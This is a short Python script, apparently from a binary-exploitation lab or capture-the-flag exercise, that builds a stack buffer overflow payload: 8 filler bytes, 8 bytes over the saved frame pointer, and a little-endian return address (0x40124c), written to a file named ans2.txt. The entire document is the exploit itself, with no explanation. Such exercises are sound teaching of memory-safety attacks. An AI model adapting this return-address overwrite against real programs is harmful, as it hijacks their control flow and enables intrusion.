buffer = b"A" * 8          
rbp = b"B" * 8              
target_addr = b"\x4c\x12\x40\x00\x00\x00\x00\x00"  # 0x40124c

payload = buffer + rbp + target_addr

with open("ans2.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans2.txt")